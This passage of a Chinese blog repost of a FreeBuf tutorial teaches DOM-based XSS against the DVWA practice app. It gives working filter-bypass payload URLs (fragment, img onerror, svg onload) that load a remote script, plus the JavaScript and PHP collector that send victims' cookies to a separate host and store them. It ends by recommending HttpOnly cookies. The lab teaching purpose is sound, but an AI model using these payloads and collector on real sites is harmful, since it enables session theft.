ajax=null;</span><br><span class="line">&#125;</span><br><span class="line">ajax.open(&quot;POST&quot;, url, true);//true代表异步</span><br><span class="line">ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">ajax.send(postStr);</span><br></pre></td></tr></table></figure>
+
+<p><strong>上面编写的代码创建了一个ajax对象，构造了一个post请求将用户的cookie作为参数发送到了<a href="http://192.168.50.156/dvwaxss/steal.php,也就是当前目录下的steal.php">http://192.168.50.156/dvwaxss/steal.php,也就是当前目录下的steal.php</a></strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">$conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">mysql_select_db(&quot;dvwacookie&quot;,$conn);</span><br><span class="line">if(isset($_GET[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_POST[&apos;data&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $sql=&quot;select * from low&quot;;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    while($row=mysql_fetch_array($result))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>steal.php将我们获取到的cookie存到数据库中</strong><br><strong>可以看到数据库已经接收到了网站用户的cookie</strong>   </p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171221/1A2FLkFFC5.PNG"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></a></p>
+<p><a href="http://p008biu9n.bkt.clouddn.com/blog/171221/Bhc2GIJc0G.PNG"><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="mark"></a></p>
+<p><strong>同样的还可以使用juery ajax，构造连接</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<p><strong>代码如下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">$.post(&quot;http://192.168.50.156/dvwaxss/steal.php&quot;,&#123;data:document.cookie&#125;);</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/171221/81H48IdjA6.PNG" alt="通过DVWA学习XSS"><br><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></p>
+<p><strong>同样接收到了cookie</strong> </p>
+<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="mark"></p>
+<h3 id="medium级别-2"><a href="#medium级别-2" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>前端代码如下，和low级别的一样</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;</span><br><span class="line">    var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;&quot; + lang + &quot;&apos;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;&apos; disabled=&apos;disabled&apos;&gt;----&lt;/option&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    document.write(&quot;&lt;option value=&apos;English&apos;&gt;English&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;French&apos;&gt;French&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;Spanish&apos;&gt;Spanish&lt;/option&gt;&quot;);</span><br><span class="line">    document.write(&quot;&lt;option value=&apos;German&apos;&gt;German&lt;/option&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>但是后端代码对url的default参数的值做了限制</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line">    $default = $_GET[&apos;default&apos;];</span><br><span class="line"></span><br><span class="line">    # Do not allow script tags</span><br><span class="line">    if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">        header (&quot;location: ?default=English&quot;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>不允许出现script标签，否则就将default的值设为默认的English，stripos还防止了大小写绕过</strong><br><strong>这里的绕过有两种方式</strong><br><strong>方式1</strong><br><strong>url中有一个字符为#，该字符后的数据不会发送到服务器端，从而绕过服务端过滤，构造连接为</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?#default=%3Cscript%3Ealert(%22xss%22)%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以看出成功绕过</strong> </p>
+<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></p>
+<p><strong>方法2</strong><br><strong>或者就是用img标签或其他标签的特性去执行js代码，比如img标签的onerror事件，构造连接</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=alert(%22xss%22)%3E</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意这里要闭合option以及select标签，这样做会破坏页面结构，隐蔽性不如第一种方法，同样的标签还有svg等，比如</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Csvg%20onload=alert(&quot;xss&quot;)%3E</span><br></pre></td></tr></table></figure>
+
+<p><strong>svg的onload事件同样可以在页面加载时执行js代码，产生弹框的效果，同样的标签还有好多</strong><br><strong>下面我们用这些方法加载远程js脚本获取网站用户的cookie(发送cookie的代码用juery)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/#?default=%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<p><strong>img标签onerror事件加载</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Cimg%20src=#%20onerror=%22var%20b=%20document.createElement(%27script%27);%20b.setAttribute(%27src%27,%27http://192.168.50.156/dvwaxss/cookie.js%27);document.getElementsByTagName(%27head%27)[0].appendChild(b);%22%3E</span><br></pre></td></tr></table></figure>
+
+<p><strong>onerror事件后执行js代码，通过js的dom操作创建script标签加载远程脚本，下面是onerror事件后执行的js代码，和上一节的一样</strong> </p>
+<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var b= document.createElement(&apos;script&apos;); </span><br><span class="line">b.setAttribute(&apos;src&apos;,&apos;http://192.168.50.156/dvwaxss/cookie.js&apos;);</span><br><span class="line">document.getElementsByTagName(&apos;head&apos;)[0].appendChild(b);</span><br></pre></td></tr></table></figure>
+
+<p><strong>远程获取cookie脚本</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var url = &quot;http://192.168.50.156/dvwaxss/steal.php&quot;;</span><br><span class="line">var postStr = &quot;data=&quot;+document.cookie;</span><br><span class="line">var ajax = null;</span><br><span class="line">if (window.XMLHttpRequest) &#123;</span><br><span class="line">    ajax = new XMLHttpRequest();</span><br><span class="line">&#125; else if (window.ActiveXObject) &#123;</span><br><span class="line">    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    ajax=null;</span><br><span class="line">&#125;</span><br><span class="line">ajax.open(&quot;POST&quot;, url, true);</span><br><span class="line">ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">ajax.send(postStr);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></p>
+<p><strong>同样svg标签的onload也可以，构造连接</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=%3C/option%3E%3C/select%3E%3Csvg%20onload=%22var%20b=%20document.createElement(%27script%27);%20b.setAttribute(%27src%27,%27http://192.168.50.156/dvwaxss/cookie.js%27);document.getElementsByTagName(%27head%27)[0].appendChild(b);%22%3E</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></p>
+<p><strong>以上方法均可以绕过medium加载远程脚本获取网站用户cookie</strong></p>
+<p>###high级别###</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    # White list the allowable languages</span><br><span class="line">    switch ($_GET[&apos;default&apos;]) &#123;</span><br><span class="line">        case &quot;French&quot;:</span><br><span class="line">        case &quot;English&quot;:</span><br><span class="line">        case &quot;German&quot;:</span><br><span class="line">        case &quot;Spanish&quot;:</span><br><span class="line">            # ok</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            header (&quot;location: ?default=English&quot;);</span><br><span class="line">            exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>在服务器后端判断，要求default的值必须为select选择菜单中的值，这里继续用上面的#符号绕过即可，构造payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.50.128:8080/DVWA-master/vulnerabilities/xss_d/?default=English#%3Cscript%20src=%22http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js%22%3E%3C/script%3E%3Cscript%20src=http://192.168.50.156/dvwaxss/cookie.js%3E%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></p>
+<p><strong>加载远程脚本</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">$.post(&quot;http://192.168.50.156/dvwaxss/steal.php&quot;,&#123;data:document.cookie&#125;);</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取high级别的网站用户cookie</strong></p>
+<p><img src="https://www.freebuf.com/buf/themes/freebuf/images/grey.gif" alt="通过DVWA学习XSS"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过对dvwa三种类型xss的学习，可以看出预防xss的方法不光要做到过滤一切用户有害输入，转义可能引起跨站漏洞的标签，最重要的是重http层做到防护，给cookie设置httponly属性，使cookie不能被javascript读取，才能有效防止用户cookie被盗用的问题</p>
+<blockquote>
+<p>转自：<a href="https://www.freebuf.com/articles/web/157953.html">https://www.freebuf.com/articles/web/157953.html</a></p>
+<p><strong>本文作者：lawliet，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。</strong></p>
+</blockquote>
+</script></strong></p>
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://the-wind-hunter.github.io">jax</a>
+            <p>原文链接：<a href="https://the-wind-hunter.github.io/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/">https://the-wind-hunter.github.io/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/</a>
+            <p>发表日期：<a href="https://the-wind-hunter.github.io/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/">九月 18日 2019, 2:32:50 下午</a>
+            <p>更新日期：<a href="https://the-wind-hunter.github.io/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/">November 21st 2019, 1:31:23 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+       
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/09/19/第六周：数据库相关注入语句的收集和学习/" title= "第六周：数据库相关注入语句的收集和学习">
+                    <div class="nextTitle">第六周：数据库相关注入语句的收集和学习</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/09/05/第四周-数据库系统功能相关学习/" title= "第四周-数据库系统功能相关学习">
+                    <div class="prevTitle">第四周-数据库系统功能相关学习</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:2509594439@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/the-wind-hunter" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#通过DVWA学习XSS"><span class="toc-number">1.</span> <span class="toc-text">通过DVWA学习XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简介"><span class="toc-number">2.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa反射型xss"><span class="toc-number">3.</span> <span class="toc-text">dvwa反射型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#测试环境"><span class="toc-number">3.1.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#low级别"><span class="toc-number">3.2.</span> <span class="toc-text">low级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium级别"><span class="toc-number">3.3.</span> <span class="toc-text">medium级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#high-级别"><span class="toc-number">3.4.</span> <span class="toc-text">high 级别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dvwa存储型xss"><span class="toc-number">4.</span> <span class="toc-text">dvwa存储型xss</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#测试环境-1"><span class="toc-number">4.1.</span> <span class="toc-text">测试环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#low级别-1"><span class="toc-number">4.2.</span> <span class="toc-text">low级别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium级别-1"><span class="toc-number">4.3.</span> <span class="toc-text">medium级别</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 27
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/20</span><a class="archive-post-title" href= "/2019/11/20/XSS演练平台/" >XSS演练平台</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2019/11/18/web-安全之-XSS-漏洞学习实战/" >web 安全之 XSS 漏洞学习实战</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2019/11/16/Web日志安全分析浅谈/" >Web日志安全分析浅谈</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/2019/11/07/pikachu之CSRF练习/" >pikachu之CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/2019/11/07/pikachu之SQL注入/" >pikachu之SQL注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/CSRF(跨站请求伪造)/" >跨站请求伪造CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2019/11/06/第十三周-web安全之手工测试之前编写的注入环境/" >第十三周web安全之手工测试之前编写的注入环境</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2019/10/20/第十周-各种注入类型的环境搭建和代码编写/" >第十周：各种注入类型的环境搭建和代码编写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/oneinstack-建站/" >oneinstack 建站</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/233/" >just a test23333333</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2019/10/16/Web配置本地yum源-Linux安全/" >We配置本地yum源-Linux安全</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href= "/2019/09/29/第九周：web-页面解析的流程学习/" >第九周：web 页面解析的流程学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/第六周：数据库相关注入语句的收集和学习/" >第六周：数据库相关注入语句的收集和学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2019/09/18/通过DVWA学习XSS/通过DVWA学习XSS/" >通过DVWA学习XSS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/第四周-数据库系统功能相关学习/" >第四周-数据库系统功能相关学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2019/08/29/Windows 上安装 MySQL/" >Windows 上安装 MySQL</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2019/08/29/hexo-github博客搭建/" >hexo+github博客搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/20</span><a class="archive-post-title" href= "/2019/08/20/Web安全学习之——基于dvwa的XSS Reflect学习教程/Web安全学习之——基于dvwa的XSS Reflect学习教程/" >Web安全学习之——基于dvwa的XSS (Reflect)学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2019/08/17/sqlmap使用的简单介绍（基于dvwa讲解）/" >sqlmap使用的简单介绍（基于dvwa讲解）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2019/08/16/第二周：认识sql并学习数据库的基础操作/" >第二周：认识SQL并学习数据库的基础操作</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2019/08/15/Web安全学习之——基于dvwa的XSS (DOM）学习教程/Web安全学习之——基于dvwa的XSS (DOM）学习教程/" >Web安全学习之——基于dvwa的XSS (DOM）学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2019/08/11/Web安全学习之——基于dvwa的XSS (Stored)学习教程/Web安全学习之——基于dvwa的XSS (Stored)学习教程/" >Web安全学习之——基于dvwa的XSS (Stored)学习教程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/10</span><a class="archive-post-title" href= "/2019/08/10/web安全学习之——基于dvwa的SQL注入演练(low)/" >SQL注入练习：基于DVWA的SQL注入演练(low)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/16/第一周：环境准备/" >第一周：环境准备</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/22/第三周：数据库系统表相关学习/" >第三周：数据库系统表相关学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href= "/2019/08/06/web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇/" >web安全学习之基于dvwa的SQL Injection (Blind)盲注--思路篇</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
